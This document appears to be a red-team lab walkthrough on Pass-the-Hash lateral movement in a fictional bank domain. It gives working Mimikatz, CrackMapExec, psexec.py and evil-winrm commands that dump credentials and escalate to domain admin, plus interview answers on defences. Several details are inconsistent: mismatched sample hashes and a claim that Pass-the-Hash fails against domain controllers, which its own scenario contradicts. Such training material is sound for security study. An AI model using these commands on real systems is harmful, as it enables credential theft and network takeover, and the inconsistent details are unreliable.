# PASS-THE-HASH: THE COMPLETE GUIDE
## Moving Laterally Without Cracking Passwords

> **Pass-the-Hash is the king of lateral movement attacks.**
>
> You don't need to crack the password. The hash IS the credential!
> - Extract NTLM hash from one machine
> - Use it to authenticate to other machines
> - Move laterally across the entire network
>
> This guide explains EVERYTHING from the ground up.

---

# TABLE OF CONTENTS

**PART 1: Understanding NTLM Authentication**
- What is a hash?
- What is NTLM?
- Why can you "pass" the hash?
- Real-world analogy

**PART 2: Lab Setup**
- Running Enable-LateralMovementPaths.ps1
- Verifying PSRemoting, WMI, RDP

**PART 3: Obtaining Hashes**
- Recap: Dumping from LSASS (Walkthrough 04)
- Dumping SAM for local admin

**PART 4: The Attack - Pass-the-Hash**
- Using CrackMapExec
- Using Impacket's psexec.py
- Using evil-winrm
- Via Sliver (advanced)

**PART 5: Lateral Movement Scenarios**
- WS01 → WS02 (workstation to workstation)
- Finding where to go next (BloodHound)
- Session hunting for Domain Admins

**PART 6: Interview Questions**

---

# 📖 PART 1: Understanding NTLM Authentication

## 1.1: What is a Hash?

**Hash = A one-way mathematical function that turns a password into a fixed-length string**

### Example:
```
Password: "Password123!"
   ↓ (NTLM hashing algorithm)
NTLM Hash: 8846f7eaee8fb117ad06bdd830b7586c
```

**Key Property:** You CANNOT reverse a hash back to the password (it's one-way).

### Real-World Analogy: Burger Grinder

```
HASHING = GRINDING MEAT
─────────────────────

Input: Whole Burger Patty (Password)
   ↓
Process: Grinder (Hash Algorithm)
   ↓
Output: Ground Beef (Hash)

Can you un-grind ground beef back into a patty? NO!
Can you verify it came from beef? YES! (compare samples)
```

---

## 1.2: What is NTLM?

**NTLM = NT LAN Manager = Windows' authentication protocol (legacy but still used everywhere)**

### How Normal NTLM Auth Works:

```
NORMAL AUTHENTICATION (Challenge-Response):
───────────────────────────────────────────

Client (WS01)                    Server (WS02)
     │                                │
     │  1. "I want to login as Bob"  │
     │ ─────────────────────────────>│
     │                                │
     │  2. "Prove it! Here's a       │
     │      random challenge: X123"   │
     │ <─────────────────────────────│
     │                                │
     │  3. Encrypts challenge with   │
     │     Bob's NTLM hash            │
     │     Result: Y456               │
     │ ─────────────────────────────>│
     │                                │
     │  4. Server encrypts same      │
     │     challenge with Bob's hash  │
     │     Compares: Y456 == Y456?    │
     │     Match! Authenticated!      │
     │ <─────────────────────────────│
```

**THE PASSWORD IS NEVER SENT!**
**ONLY THE HASH IS USED FOR ENCRYPTION!**

---

## 1.3: Why Can You "Pass" the Hash?

**Insight:** The hash IS the credential for NTLM authentication!

```
PASS-THE-HASH ATTACK:
─────────────────────

Attacker has: NTLM hash (stolen from LSASS/SAM)
Attacker does NOT have: The actual password

But... since Windows only uses the HASH for NTLM auth:
  ↓
Attacker can authenticate by providing the hash!
  ↓
Windows thinks: "They encrypted the challenge correctly, they must know the password!"
  ↓
Access granted!
```

**It's like having a photocopy of a key that still works in the lock!**

---

## 1.4: Real-World Analogy: Hotel Key Cards

```
TRADITIONAL LOGIN = Physical Key
─────────────────────────────────
You show the actual metal key → Door opens
If someone steals your key → They can open the door

PASS-THE-HASH = Key Card Copy
──────────────────────────────
Hotel uses magnetic pattern (hash) to verify
Clerk keeps a copy of the pattern in the system
Thief copies the magnetic pattern (hash)
Thief creates new card with same pattern → Door opens!
They never knew your "password" (the master key)
```

---

# 📖 PART 2: Lab Setup

## 2.1: Running the Setup Script

**On both WS01 and WS02, run:**
```powershell
cd C:\AD-RTO\lab-config\workstation
.\Enable-LateralMovementPaths.ps1
```

### What This Enables:
- **PSRemoting (WinRM):** Port 5985/5986 - Remote PowerShell
- **WMI:** Windows Management Instrumentation - Remote commands
- **RDP:** Remote Desktop (port 3389)
- **Admin Shares:** C$, ADMIN$ accessible
- **Disables Remote UAC Filtering:** Allows lateral movement

---

# 📖 PART 3: Obtaining Hashes

## 3.1: Recap - Dumping LSASS (from Walkthrough 04)

You should have already dumped credentials:

```bash
[server] sliver (ORSUBANK_WS01) > execute-assembly /opt/tools/Mimikatz.exe "sekurlsa::logonpasswords" "exit"
```

**Look for:**
```
User Name         : lakshmi.devi
Domain            : ORSUBANK
NTLM              : 31d6cfe0d16ae931b73c59d7e0c089c0
```

**That NTLM hash is your ticket to lateral movement!**

---

## 3.2: Dumping SAM for Local Admin

**For workstation-to-workstation movement, you want the local Administrator hash:**

```bash
[server] sliver (ORSUBANK_WS01) > execute-assembly /opt/tools/Mimikatz.exe "lsadump::sam" "exit"
```

**Output:**
```
RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 8846f7eaee8fb117ad06bdd830b7586c
```

**Why this matters:**
- If WS01 and WS02 have the SAME local Administrator password...
- You can use this hash to access WS02!

---

# 📖 PART 4: The Attack - Pass-the-Hash

## 4.1: Method 1 - CrackMapExec (Easiest!)

**CrackMapExec (CME) is the BEST tool for Pass-the-Hash.**

### Install on Kali:
```bash
sudo apt install crackmapexec
```

### Basic Pass-the-Hash:
```bash
crackmapexec smb 192.168.100.30 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c --local-auth
```

**Command breakdown:**
- `smb` = Protocol (SMB port 445)
- `192.168.100.30` = Target (WS02)
- `-u Administrator` = Username
- `-H 8846f7eaee8fb117ad06bdd830b7586c` = NTLM hash (not password!)
- `--local-auth` = Authenticate as local account (not domain)

**Expected output:**
```
SMB   192.168.100.30   445   WS02   [+] WS02\Administrator 8846f7eaee8fb117ad06bdd830b7586c (Pwn3d!)
```

**(Pwn3d!) = You have admin access!**

---

### 4.1.2: Execute Commands with CME

**Run a command:**
```bash
crackmapexec smb 192.168.100.30 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c --local-auth -x "whoami"
```

**Dump SAM on WS02:**
```bash
crackmapexec smb 192.168.100.30 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c --local-auth --sam
```

**Dump LSASS on WS02:**
```bash
crackmapexec smb 192.168.100.30 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c --local-auth --lsa
```

---

## 4.2: Method 2 - Impacket's psexec.py

**Impacket = Suite of Python tools for Windows protocol attacks**

### Install:
```bash
sudo apt install impacket-scripts
```

### Pass-the-Hash with psexec.py:
```bash
psexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c Administrator@192.168.100.30
```

**Command breakdown:**
- `-hashes :NTLM_HASH` = The hash (empty LM hash before the colon)
- `Administrator@IP` = User and target

**Result:** You get an interactive shell on WS02!

```
C:\Windows\system32> whoami
nt authority\system
```

**You're SYSTEM on WS02!**

---

## 4.3: Method 3 - evil-winrm (If WinRM is enabled)

**evil-winrm = Tool for WinRM access**

### Install:
```bash
sudo gem install evil-winrm
```

### Pass-the-Hash:
```bash
evil-winrm -i 192.168.100.30 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c
```

**Result:** PowerShell prompt on WS02!

---

## 4.4: Domain Account Pass-the-Hash

**If you dumped a DOMAIN user's hash (like lakshmi.devi), use it for domain auth:**

```bash
crackmapexec smb 192.168.100.30 -u lakshmi.devi -H 31d6cfe0d16ae931b73c59d7e0c089c0 -d orsubank.local
```

**Note:** Removed `--local-auth` (it's a domain account)

---

# 📖 PART 5: Lateral Movement Scenarios

## 5.1: Scenario - WS01 → WS02

**Your situation:**
- Compromised WS01
- Dumped local Administrator hash: `8846f7eaee...`
- Know WS01 and WS02 probably have same local admin password

**Attack:**
```bash
# Verify access
crackmapexec smb 192.168.100.30 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c --local-auth

# Dump credentials on WS02
crackmapexec smb 192.168.100.30 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c --local-auth --lsa

# Hope to find Domain Admin session!
```

---

## 5.2: Finding Where to Go - BloodHound

**Use BloodHound to find:**
- **"Find Computers where Domain Admins are logged in"**

**Query:**
```cypher
MATCH (m:User)-[:MemberOf*1..]->(n:Group {name:"DOMAIN ADMINS@ORSUBANK.LOCAL"})
MATCH p=(m)-[:HasSession]->(c:Computer)
RETURN p
```

**Result:**
```
lakshmi.devi (Domain Admin) ──[HasSession]──> WS02
```

**This means:**
- lakshmi.devi (DA) is logged into WS02
- If you get SYSTEM

 on WS02, you can dump lakshmi.devi's credentials!

---

## 5.3: Session Hunting for Domain Admin

**Step 1:** Pass-the-Hash to WS02
```bash
psexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c Administrator@192.168.100.30
```

**Step 2:** Dump LSASS on WS02
```bash
# Upload Mimikatz via Sliver
[server] sliver (ORSUBANK_WS02) > execute-assembly /opt/tools/Mimikatz.exe "sekurlsa::logonpasswords" "exit"
```

**Step 3:** Find Domain Admin credentials!
```
User Name         : lakshmi.devi
Domain            : ORSUBANK
NTLM              : a1b2c3d4e5f6g7h8i9j0...
```

**Step 4:** Pass-the-Hash as Domain Admin!
```bash
crackmapexec smb DC01.orsubank.local -u lakshmi.devi -H a1b2c3d4e5f6g7h8... -d orsubank.local
```

**You are now Domain Admin!**

---

# 📖 PART 6: Interview Questions

## Q1: "Explain how Pass-the-Hash works."

**YOUR ANSWER:**
"Pass-the-Hash exploits NTLM authentication. In NTLM, the password hash is used to encrypt a challenge-response, but the password itself is never transmitted. Windows stores NTLM hashes in memory (LSASS) and on disk (SAM). 

When I dump these hashes using Mimikatz, I can use them directly for authentication without cracking them. Tools like Impacket or CrackMapExec can perform NTLM authentication using just the hash, because the hash IS the credential in this protocol.

It's effective for lateral movement because local Administrator passwords are often reused across workstations in enterprises."

## Q2: "What's the difference between Pass-the-Hash and Pass-the-Password?"

**YOUR ANSWER:**
"**Pass-the-Password**: You have the actual plaintext password and use it normally. This works for any authentication method (NTLM, Kerberos, etc.).

**Pass-the-Hash**: You only have the NTLM hash, not the password. You can ONLY use NTLM authentication, not Kerberos. This is why Pass-the-Hash doesn't work against domain controllers (which prefer Kerberos).

In practice, I use Pass-the-Hash for workstation lateral movement and Pass-the-Ticket for domain controller access."

## Q3: "How do you defend against Pass-the-Hash?"

**YOUR ANSWER:**
"Defense requires multiple layers:

1. **Restrict Local Admin Access**: Use LAPS (Local Administrator Password Solution) to randomize local admin passwords per machine
2. **Credential Guard**: Windows feature that isolates LSASS in a virtualized container
3. **Network Segmentation**: Limit lateral movement paths
4. **Disable NTLM**: Force Kerberos-only (difficult in practice)
5. **Monitor for PtH**: Event ID 4624 (Type 3 logon with NTLM) from admin accounts
6. **Protected Users Group**: Members cannot use NTLM

LAPS is the most practical - it

 breaks the 'same local admin everywhere' assumption."

## Q4: "Can you Pass-the-Hash to a domain controller?"

**YOUR ANSWER:**
"Generally NO for direct authentication. Domain controllers prefer Kerberos, not NTLM. However, there are specific scenarios:

1. **SMB Signing Disabled**: Some legacy DCs may accept NTLM if SMB signing is off
2. **Services that Force NTLM**: Certain applications may force NTLM downgrade
3. **Relay Attacks**: You can relay NTLM to DC services (different from Pass-the-Hash)

For domain controller access with just a hash, I'd use:
- Pass-the-Hash to get to another box
- Dump Kerberos tickets there
- Pass-the-Ticket to the DC

Or if I have a domain admin hash, I can DCSync from any domain-joined machine."

## Q5: "What is the NTLM hash format?"

**YOUR ANSWER:**
"The full format is: `LM:NTLM`

Example: `aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c`

- **LM Hash** (left): Legacy, disabled on modern Windows. The value `aad3b435b51404eeaad3b435b51404ee` means 'empty' or 'disabled'
- **NTLM Hash** (right): MD4 hash of the password. This is what's actually used.

When passing the hash, I typically provide just the NTLM portion. Tools like CrackMapExec use `-H` for NTLM only, or `-hashes :NTLM` in Impacket where the colon indicates empty LM."

---

# ✅ CHECKLIST

- [ ] Ran Enable-LateralMovementPaths.ps1 on WS01 and WS02
- [ ] Dumped LSASS on WS01 (got domain user hashes)
- [ ] Dumped SAM on WS01 (got local Administrator hash)
- [ ] Used CrackMapExec to Pass-the-Hash to WS02
- [ ] Confirmed access with (Pwn3d!)
- [ ] Dumped credentials on WS02
- [ ] Found Domain Admin session on WS02
- [ ] Dumped Domain Admin hash
- [ ] Used DA hash to access DC01

---

# 🔗 What's Next?

**If you found Domain Admin hash:**
→ **[07. Golden Ticket](./07_golden_ticket.md)** (Persistent access)
→ **[04b. DCSync](./04b_dcsync_attack.md)** (Dump all domain hashes)

**If you found Kerberos tickets instead:**
→ **[06b. Pass-the-Ticket](./06b_pass_the_ticket.md)**

**If you want complete domain control:**
→ **[07. Golden Ticket](./07_golden_ticket.md)**

---

**MITRE ATT&CK Mapping:**
| Technique | ID | Description |
|-----------|-----|-------------|
| Use Alternate Authentication Material: Pass the Hash | T1550.002 | Pass-the-Hash |
| Lateral Tool Transfer | T1570 | Moving tools between systems |
| Remote Services: SMB/Windows Admin Shares | T1021.002 | Lateral movement via SMB |

**Difficulty:** ⭐⭐ (Beginner-Intermediate)
**Interview Importance:** ⭐⭐⭐⭐⭐ (Core lateral movement technique)

---
